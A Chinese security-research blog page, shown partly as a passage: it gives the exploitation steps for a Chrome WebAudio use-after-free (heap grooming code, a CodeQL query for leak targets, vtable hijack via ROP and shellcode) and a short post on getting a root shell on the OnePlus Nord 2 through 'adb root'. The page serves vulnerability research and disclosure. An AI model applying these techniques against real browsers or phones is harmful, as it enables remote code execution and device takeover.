<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">createSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  let s = audioCtx.<span class="built_in">createChannelMerger</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第一个ScriptProcessorNode的音频处理器。</span></span><br><span class="line"><span class="function">function <span class="title">scriptProcess2</span><span class="params">(audioProcessingEvent)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 需要为AudioOutputNode创建孔，使它们不会被回收。</span></span><br><span class="line">  <span class="built_in">createSource</span>();</span><br><span class="line">  ...</span><br><span class="line">  script<span class="number">2.</span><span class="built_in">disconnect</span>();  <span class="comment">//&lt;--- 移除GainNode的引用</span></span><br><span class="line">  <span class="built_in">gc</span>();                  <span class="comment">//&lt;--- 首先删除GainNode, 然后在createSource中创建ChannelMergerNode</span></span><br><span class="line">  <span class="comment">// 需要等待GC分配的小对象被清除。</span></span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">4000</span>);</span><br><span class="line">  let gain = audioCtx<span class="number">2.</span><span class="built_in">createGain</span>();  							 <span class="comment">//&lt;---- 替换gain以获取虚函数调用</span></span><br><span class="line">  let src0 = audioCtx<span class="number">2.</span><span class="built_in">createChannelMerger</span>(<span class="number">1</span>); 		   <span class="comment">//&lt;--- 为AudioBus安排堆栈</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然对createSource的调用看起来是多余的，但是，在createSource中创建的ChannelMergerNode直到垃圾回收时才会被删除，到那时，它实际上会在GainNode之后被删除，在freelist的头部留下额外的AudioOutputNode。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/heap1.png"></p>
<p>当被删除的GainNode被另一个GainNode取代时，旧GainNode的已释放的AudioNodeOutput将不会被占用。这个被释放的GainNode将负责调用Bus并为我们提供一个被释放的AudioBus。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/heap2.png"></p>
<p>在图中，绿色箭头表示当另一个对象被删除时被释放的对象，红色箭头表示被创建的对象。</p>
<p>为了替换AudioNodeOutput拥有的大小为32的AudioBus，也需要对大小为32的桶进行操作。为此再次使用另一个ChannelMergerNode。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/heap3.png"></p>
<p>同时，还必须注意不要替换被删除的GainNode的AudioNodeOutput…</p>
<p>虽然有很多要求需要满足，而且AudioBus是从一个相当嘈杂的桶中分配的，但与其他情况不同的是，在其他情况下，堆经常被其他进程共享，而这些进程并不在我们的控制范围内，而渲染器在很大程度上是一个孤立的进程，完全拥有其堆。因此，只要脚本是从一个新的渲染器中运行的，就可以以非常精确和具体的方式进行渲染器堆的喷射（当从登录的上下文中点击一个链接时，如通过电子邮件或Twitter），所以这不会对漏洞的可靠性造成太大的问题。</p>
<p>一旦堆被放入正确的状态，使现在被删除的GainNode所拥有的AudioBus处于freelist的正确位置，AudioContext::decodeAudioData函数就可以用来创建一个适当长度的AudioBus来触发越界读取。这个函数接收一个音频文件的ArrayBuffer（例如mp3、ogg），并在后台线程中对其进行解码。它将创建一个具有适当长度的AudioBus来容纳解码后的结果。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AsyncAudioDecoder::DecodeOnBackgroundThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    DOMArrayBuffer* audio_data,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span> sample_rate,</span></span></span><br><span class="line"><span class="params"><span class="function">    V8DecodeSuccessCallback* success_callback,</span></span></span><br><span class="line"><span class="params"><span class="function">    V8DecodeErrorCallback* error_callback,</span></span></span><br><span class="line"><span class="params"><span class="function">    ScriptPromiseResolver* resolver,</span></span></span><br><span class="line"><span class="params"><span class="function">    BaseAudioContext* context,</span></span></span><br><span class="line"><span class="params"><span class="function">    scoped_refptr&lt;base::SingleThreadTaskRunner&gt; task_runner)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  scoped_refptr&lt;AudioBus&gt; bus = <span class="built_in">CreateBusFromInMemoryAudioFile</span>(</span><br><span class="line">      audio_data-&gt;<span class="built_in">Data</span>(), audio_data-&gt;<span class="built_in">ByteLength</span>(), <span class="literal">false</span>, sample_rate);  <span class="comment">//&lt;----- 创建AudioBus</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (context) &#123;</span><br><span class="line">    <span class="built_in">PostCrossThreadTask</span>(</span><br><span class="line">        *task_runner, FROM_HERE,</span><br><span class="line">        <span class="built_in">CrossThreadBindOnce</span>(&amp;AsyncAudioDecoder::NotifyComplete,</span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(audio_data),</span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(success_callback),</span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(error_callback),</span><br><span class="line">                            WTF::<span class="built_in">RetainedRef</span>(std::<span class="built_in">move</span>(bus)),            <span class="comment">//&lt;------ 传入NotifyComplete</span></span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(resolver),</span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(context)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，创建的AudioBus被作为主线程上的一个任务传递给NotifyComplete，并在NotifyComplete完成后被删除。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AsyncAudioDecoder::NotifyComplete</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    DOMArrayBuffer*,</span></span></span><br><span class="line"><span class="params"><span class="function">    V8DecodeSuccessCallback* success_callback,</span></span></span><br><span class="line"><span class="params"><span class="function">    V8DecodeErrorCallback* error_callback,</span></span></span><br><span class="line"><span class="params"><span class="function">    AudioBus* audio_bus,</span></span></span><br><span class="line"><span class="params"><span class="function">    ScriptPromiseResolver* resolver,</span></span></span><br><span class="line"><span class="params"><span class="function">    BaseAudioContext* context)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  AudioBuffer* audio_buffer = AudioBuffer::<span class="built_in">CreateFromAudioBus</span>(audio_bus);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the context is available, let the context finish the notification.</span></span><br><span class="line">  <span class="keyword">if</span> (context) &#123;</span><br><span class="line">    context-&gt;<span class="built_in">HandleDecodeAudioData</span>(audio_buffer, resolver, success_callback,</span><br><span class="line">                                   error_callback);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于AudioBus在这里只是一个临时对象，在解码完成后会被删除，所以需要确保它的寿命足够长，以便发生越界读取。为了做到这一点，可以使用javascript函数setInterval来干扰任务队列。当调用setInterval时，它会创建一个延迟的任务。这个任务以及DecodeOnBackgroundThread发布的NotifyComplete任务被发布到同一个任务队列中，在主线程上执行。通过用setInterval创建任务，我可以使NotifyComplete的运行出现延迟，因为在NotifyComplete之前发布的任何任务都必须在NotifyComplete之前运行，而且它们都必须在主线程上运行。这将允许在足够长的时间内保持AudioBus的活力，这样当AudioNodeInput::SumAllConnections导致越界读取时，在音频线程中使用这个AudioBus，它将仍然活着。</p>
<p>通过使用ffmpeg来创建一个无声的mp3文件，创建一个最小长度为47的AudioBus。由于来自AudioNodeInput的AudioBus的长度是128，而且AudioBus的后备存储是浮点格式，有16个大小的padding（Android为16，x86为32），这意味着可以使用界外读原语来读取大小在204和528之间的对象。CodeQL查询，可以用来识别这样的对象，并选择适当的文件长度来使用。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FastMallocClass</span> extends Class &#123;</span><br><span class="line">    <span class="built_in">FastMallocClass</span>() &#123;</span><br><span class="line">        <span class="built_in">exists</span>(Operator op, Function fastMalloc | op.<span class="built_in">hasName</span>(<span class="string">&quot;operator new&quot;</span>) <span class="keyword">and</span></span><br><span class="line">          fastMalloc.<span class="built_in">hasName</span>(<span class="string">&quot;FastMalloc&quot;</span>) <span class="keyword">and</span> op.<span class="built_in">calls</span>(fastMalloc) <span class="keyword">and</span></span><br><span class="line">          op.<span class="built_in">getDeclaringType</span>() = <span class="keyword">this</span>.getABaseClass*()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FastMallocClass c</span><br><span class="line">where c.<span class="built_in">getSize</span>() &lt;= <span class="number">528</span> <span class="keyword">and</span> c.<span class="built_in">getSize</span>() &gt; <span class="number">204</span></span><br><span class="line">select c, c.<span class="built_in">getLocation</span>(), c.<span class="built_in">getSize</span>()</span><br></pre></td></tr></table></figure>

<p>在这里做了改进，只包括在FastMalloc分区中分配的对象，也就是分配AudioBus的备份存储（AudioArray）的地方。看了一下结果，BiquadDSPKernel特别有用。除了要泄露vtable之外，它还包含一个字段biquad_，存储了5个AudioDoubleArray。这意味着通过泄露BiquadDSPKernel类型的对象，就能同时泄露这些AudioDoubleArray的后备存储地址，然后可以用来存储一个假的vtable来劫持虚拟函数调用。</p>
<p>因此，通过安排堆，把BiquadDSPKernel放在AudioBus后面，然后触发bug导致越界读取，就能把BiquadDSPKernel对象泄漏到下一个AudioNodeInput的AudioBus中。为了读取输入数据，可以使用ScriptProcessorNode，它允许使用javascript函数来读取输入。然后，可以获得泄漏的vtable和各种AudioDoubleArray的地址。</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>在这一点上，其余的利用方法是相当标准的。一旦获得了BiquadDSPKernel的vtable的地址，就可以用它来找到libchrome.so的偏移。有了libchrome.so的偏移量，就可以找到里面的ROP小工具的地址，并在属于BiquadDSPKernel的AudioDoubleArray中创建一个假的vtable，这样，这个假vtable中的虚拟函数指针就会指向所选择的小工具。</p>
<p>之后，自由使用后的漏洞就可以再一次被触发了。这一次，它直接进入漏洞的第二节Primitives中的路径，调用一个虚拟函数。被释放的AudioHandler对象现在可以被一个适当大小的AudioArray所取代，这个AudioArray被填充了受控数据，这样它的vtable就指向了在上面创建的假vtable。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/call_func.png"></p>
<p>使用类似于<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf/">这篇文章</a>中使用的小工具，调用OS::SetPermissions，将BiquadDSPKernel中的AudioDoubleArray的页面权限覆盖为rwx。一旦完成，就可以在这些AudioDoubleArray中放置shell代码，并再次触发这个bug来运行任意代码。在实际的漏洞中，一个延迟节点被用作免费的AudioHandler，IIRFilterNode的前馈系数被用来伪造DelayHandler。</p>
<p>完整的exp在<a target="_blank" rel="noopener" href="https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/blink/CVE-2020-15972">这里</a>。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在这篇文章中，我们再次看到，复杂的对象清理，加上多线程的微妙性，导致了WebAudio中的漏洞可以作为渲染器RCE来利用。虽然与v8中的漏洞相比，blink中的漏洞一般需要更多的时间来利用，但它仍然是Chrome中获得（沙盒）RCE的一个巨大而可行的攻击面。</p>
<p>就整个系列而言，我们还看到了沙盒架构，加上Chrome浏览器中漏洞的快速修复，确实有助于使其难以获得完整的链（并确保完整的链即使进入野外也不会持续太久）。本系列中使用的渲染器漏洞从首次报告到修复大约需要六周时间，而沙盒逃逸也需要类似的时间来修复，这对Chrome来说是相当标准的。这大大降低了渲染器漏洞与沙盒逃逸重叠的可能性。正如我们在这一系列案例中看到的那样，由于这种快速修复漏洞的方式，在稳定版本的Chrome浏览器中，渲染器漏洞并没有与沙盒逃逸重叠在一起。正是修复漏洞的效率使沙箱变得更加有效。另一方面，我们也从沙盒逃逸的帖子中看到了每次启动一次的ASLR（即从Zygote分叉的进程）如何大大降低了安卓系统中应用沙盒的有效性。虽然Chrome的基本地址在渲染器和浏览器之间仍然是随机的，但许多其他库不是，我仍然能够使用这些库中的小工具，不费吹灰之力就逃出Chrome的沙箱。虽然每次启动一次的ASLR对于缓解远程攻击仍然非常有用，但正如我们在这篇文章中所看到的，编写漏洞的大部分精力都花在了击败ASLR上，它对于本地权限升级没有什么用处。由于两个主要平台（Windows和Android）都实施了每次启动一次的ASLR，这仍然是Chrome沙箱的最大弱点之一。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-11-27T10:58:56.000Z" title="2021/11/27 18:58:56">2021-11-27</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-11-27T13:14:42.803Z" title="2021/11/27 21:14:42">2021-11-27</time></span><span class="level-item">2 minutes read (About 363 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/11/27/OnePlus-Nord-2%E6%BC%8F%E6%B4%9E-root-shell/">OnePlus Nord 2漏洞 - root shell</a></p><div class="content"><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在手机生产时，厂商需要开启包括root访问权限在内的各种调试功能，在手机上线时关闭这些功能。</p>
<p>但OnePlus Nord 2的官方<a target="_blank" rel="noopener" href="https://www.xda-developers.com/tag/oxygenos/">OxygenOS</a>版本忘记关闭root功能了，这样就导致可以在OnePlus Nord 2的recovery环境获取到一个<strong>root shell</strong>。</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>1.重启OnePlus Nord 2至recovery模式（也可以不进，因为漏洞出现在恢复模式之前）：同时按下音量和电源按钮，直到在屏幕左下角看到一个小小的“恢复模式”；</p>
<p>2.连接adb；</p>
<p>3.执行<code>adb root</code>命令，可能会超时，但adbd会以root身份运行；</p>
<p>4.执行<code>adb shell whoami</code>可以看到输出为root。</p>
<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>1.取证，转储设备的每个分区。</p>
<p>2.上传可执行文件到<code>/data/local/tmp</code>并运行，加载执行其他漏洞利用。</p>
<p>3.以root身份调用setprop修改prop值，劫持特权OEM变量。</p>
<p>由于即使没有解锁开发者选项，在恢复模式或正常android中连接usb，也会提示usb调试访问请求，因此这个漏洞不仅仅局限于恢复模式。</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>截至2021年11月26日，<a target="_blank" rel="noopener" href="https://www.xda-developers.com/oneplus-nord-2-oxygenos-november-2021-patches/">印度与欧洲的OxygenOS</a>都存在，可能还会影响部分后续固件。</p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/tags/android/">Previous</a></div><div class="pagination-next is-invisible is-hidden-mobile"><a href="/tags/android/page/3/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/tags/android/">1</a></li><li><a class="pagination-link is-current" href="/tags/android/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/u/19711495?v=4" alt="buffer0verflooow"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">buffer0verflooow</p><p class="is-size-6 is-block">Security Researcher</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Beijing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">56</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">51</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-10T06:23:56.000Z">2022-10-10</time></p><p class="title"><a href="/2022/10/10/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-30T07:29:09.000Z">2022-07-30</time></p><p class="title"><a href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Android安全笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-20T12:35:56.000Z">2022-07-20</time></p><p class="title"><a href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Android中间人攻击方法整理</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-04T12:34:01.000Z">2022-07-04</time></p><p class="title"><a href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 魔形女漏洞</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-01T13:59:36.000Z">2022-07-01</time></p><p class="title"><a href="/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/">macOS Intel图形内核拓展RCE+EOP</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ASN-1/"><span class="tag">ASN.1</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppleAVE2/"><span class="tag">AppleAVE2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ContentProvider/"><span class="tag">ContentProvider</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOServices/"><span class="tag">IOServices</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LPE/"><span class="tag">LPE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PendingIntent/"><span class="tag">PendingIntent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adobe/"><span class="tag">adobe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/afl/"><span class="tag">afl++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ams/"><span class="tag">ams</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">18</span></a></div><div class="control"><a class="tags has-addons" href="/tags/aosp/"><span class="tag">aosp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apple/"><span class="tag">apple</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/arm64/"><span class="tag">arm64</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cfprefsd/"><span class="tag">cfprefsd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/darwin/"><span class="tag">darwin</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/exploit/"><span class="tag">exploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gpu/"><span class="tag">gpu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hook/"><span class="tag">hook</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intel/"><span class="tag">intel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intent/"><span class="tag">intent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iomfb/"><span class="tag">iomfb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ios/"><span class="tag">ios</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/logic-vul/"><span class="tag">logic vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/lpe/"><span class="tag">lpe</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mach/"><span class="tag">mach</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/macos/"><span class="tag">macos</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mig/"><span class="tag">mig</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/note/"><span class="tag">note</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/npu/"><span class="tag">npu</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pac/"><span class="tag">pac</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pipe/"><span class="tag">pipe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pongoOS/"><span class="tag">pongoOS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qemu/"><span class="tag">qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcom/"><span class="tag">qualcom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcomm/"><span class="tag">qualcomm</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/safari/"><span class="tag">safari</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/samsung/"><span class="tag">samsung</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/soot/"><span class="tag">soot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/static-analysis/"><span class="tag">static analysis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/syzkaller/"><span class="tag">syzkaller</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tcc/"><span class="tag">tcc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/telecom/"><span class="tag">telecom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/uaf/"><span class="tag">uaf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/webaudio/"><span class="tag">webaudio</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xnu/"><span class="tag">xnu</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xpc/"><span class="tag">xpc</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 buffer0verflooow</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
